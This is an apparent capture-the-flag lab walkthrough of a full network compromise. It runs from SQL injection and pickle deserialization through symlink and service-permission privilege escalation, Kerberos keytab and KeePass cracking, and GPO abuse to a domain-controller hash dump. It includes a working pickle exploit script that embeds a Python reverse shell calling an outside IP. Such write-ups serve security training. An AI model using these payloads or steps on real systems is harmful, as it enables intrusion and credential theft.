I fuzzed the site's directories and found a hidden page at /portal, which sent me straight to a login screen.

<figure><img src="../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>



I tried a basic SQL injection payload on the login form, and it worked perfectly, logging me straight into the admin account without needing a password.

<figure><img src="../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>

While poking around the "useful links" section in the site archive, I stumbled upon a file called backup.zip just sitting there available for download.

<figure><img src="../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>

Inside the zip file, I found app.py and noticed it was using Python's pickle.loads to handle data. Because pickle is inherently unsafe when handling untrusted input, wrote a script using the **reduce** method to pack a standard Python reverse shell into a Base64-encoded serialized payload.

```
import pickle, os, base64
CMD = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.200.113.188",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")' '''
class Exploit:
	    def __reduce__(self):
	        return (os.system, (CMD,))
b64 = base64.b64encode(pickle.dumps(Exploit())).decode()
print(b64)
```

I started a Netcat listener on port 4444, sent the crafted payload to the application, and successfully triggered a reverse shell back to my machine.

<figure><img src="../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>

I took that Base64-encoded payload and pasted it directly into my browser's session cookie value. When I refreshed the page, the server tried to read the cookie, processed my malicious data, and ran the reverse shell code

<figure><img src="../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>

Once I was on the system, I ran pspy64 to watch running processes in real-time. I noticed a script called backup.sh being executed periodically by a user named joh

<figure><img src="../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>

I looked at backup.sh and saw it checks for a file named backup\_config inside phil's staging folder (/home/phil/backup\_staging). Since I had control over that folder, I created a symlink named backup\_config pointing directly to John's private SSH key (/home/john/.ssh/id\_rsa). When the script ran as John, it read my symlink and printed the entire private key right into the public log file (/var/log/backup/backup.log).

<figure><img src="../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (333).png" alt=""><figcaption></figcaption></figure>

After a short wait for the cron job to trigger, I checked /var/log/backup/backup.log and found John's private SSH key printed out right there in the logs.

<figure><img src="../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

I used the extracted SSH key to log in as john and checked his permissions. It turned out he was a member of the disk group, which is a massive privilege escalation vector because it allows direct reading and writing to the system's hard drives

<figure><img src="../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

Since the disk group gives direct access to the file system drives, I used the debugfs utility to bypass standard file permissions. This let me open the main system drive, read root's private SSH key (/root/.ssh/id\_rsa), and use it to log in straight as root

<figure><img src="../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

While exploring the /etc directory, I checked out the Kerberos configuration and found a file called /etc/krb5.keytab. When I looked inside, I found the stored Kerberos keys and service principal details for the user account svc\_web

<figure><img src="../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>

#### Keytab extract repo  - [https://github.com/sosdave/KeyTabExtract/tree/master](https://github.com/sosdave/KeyTabExtract/tree/master)



I set up a quick Netcat relay to copy the /etc/krb5.keytab file over to my local machine. Once I had it locally, I cloned a keytab extraction repository to pull out the actual password hashes for the svc\_web account.

<figure><img src="../.gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>



### Port 445 - SMB

The extracted hash turned out to be valid, allowing me to authenticate as svc\_web and successfully connect to a restricted network share named IT\_onboarding

<figure><img src="../.gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>

I looked through the IT\_Onboarding share and found a PDF file named SEC-POL-2026.pdf, which I immediately downloaded using the get command

<figure><img src="../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>

I opened the downloaded PDF and found the exact naming convention used to build temporary initial passwords for new employees: \[First3\_Upper]!\[Year]\[Special]\[Last2\_Lower]. I ran an LDAP user export tool to grab a list of all domain user names from the network (users.txt), and then used the policy rules to generate a custom list of potential passwords to try against them

<figure><img src="../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>

Got valid credentials for user l\_conrad&#x20;

<figure><img src="../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>

### Port 5985 - Winrm&#x20;

<figure><img src="../.gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>

I ran a privilege escalation check and found a service called CTOSInventorySvc running as LocalSystem. Crucially, standard users (BUILTIN\Users) have AllAccess permissions over it, meaning I can freely modify the service configuration to point to a malicious binary or command and execute it with full SYSTEM privileges.

<figure><img src="../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

### Note:-&#x20;

```
 Due to a technical issue during the lab, the target machine required a full restart. Because of this, the target IP address changed midway through the challenge, but the overall exploitation path, steps, and vulnerabilities remained exactly the same
```



I tried to exploit the weak service permissions by changing the ImagePath configuration of CTOSInventorySvc to run a command that adds l\_conrad directly to the local Administrators group.

<figure><img src="../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>

After the service ran my command, I disconnected and logged back in. The privilege escalation worked perfectly, and I now had full administrator permissions. While digging through the Administrator's Documents folder, I found an interesting password database file named database.kdbx and downloaded it to my local machine.

<figure><img src="../.gitbook/assets/image (351).png" alt=""><figcaption></figcaption></figure>

Since the database.kdbx file was password-protected, I ran it through keepass2john to extract the master password hash. I then fed that hash into John the Ripper to crack the password so I could unlock the database.

<figure><img src="../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

Found svc\_infra\_mgr credentials

<figure><img src="../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>



### Bloodhound Data Collection

I imported the collected domain data into BloodHound and mapped out a path to Domain Admin. The tool revealed that my compromised user svc\_infra\_mgr has GenericWrite permissions over the it\_ops\_lead user, who in turn can add members to the policy\_automation group. From there, the policy\_automation group has WriteOwner permissions on the Domain Controller's group policy, creating a clear chain for full domain takeover.

<figure><img src="../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

abused generic write permissions&#x20;

<figure><img src="../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

Added user it\_ops\_lead to the group

<figure><img src="../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>

Following the path found in BloodHound, I used Impacket’s owneredit.py script to change the owner of the vulnerable Domain Policy object directly to it\_ops\_lead. Once the ownership was modified successfully, I ran dacledit.py to give it\_ops\_lead full control over the policy's DACL permissions. This successfully set the stage to push malicious policy updates straight to the Domain Controller.

<figure><img src="../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>

Found the gpo-id&#x20;

<figure><img src="../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>

I used pygpoabuse.py to inject the command net localgroup administrators it\_ops\_lead /add into the compromised policy. This automatically created a scheduled task that added it\_ops\_lead to the administrators group, giving me full administrative control.

<figure><img src="../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>

Now that I had administrative control, I ran Impacket’s secretsdump against the Domain Controller. This dumped the entire NTDS database, successfully scoring the password hashes for both the administrator account and the krbtgt account to finish the takeover.

<figure><img src="../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>
